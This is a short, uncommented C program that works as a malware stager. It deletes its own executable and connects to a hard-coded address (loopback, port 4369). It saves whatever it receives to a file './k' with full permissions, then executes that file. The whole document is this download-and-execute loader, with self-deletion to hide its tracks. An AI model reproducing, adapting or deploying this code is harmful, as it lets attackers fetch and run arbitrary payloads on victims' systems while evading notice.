#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUF_SIZE 1024

int	main(int argc, char *argv[])
{
	if(fork() == 0)
		return (0);
	unlink(argv[0]);
	int dropped_file = open("./k", O_WRONLY | O_TRUNC | O_CREAT, 0777);
	int s, l;
	unsigned long addr = 0x0100007f11110002;
	unsigned char buf[BUF_SIZE];

	char *name[2] = {"./k", NULL};

	s = socket(AF_INET, SOCK_STREAM, 0);
	connect(s, (struct sockaddr*)&addr, 16);

	while (1)
	{
		if ((l = recv(s, buf, BUF_SIZE, 0)) <= 0)
			break;
		write(dropped_file, buf, l);
	}
	close(s);
	close(dropped_file);
	execv(name[0], name);
	return (0);
}
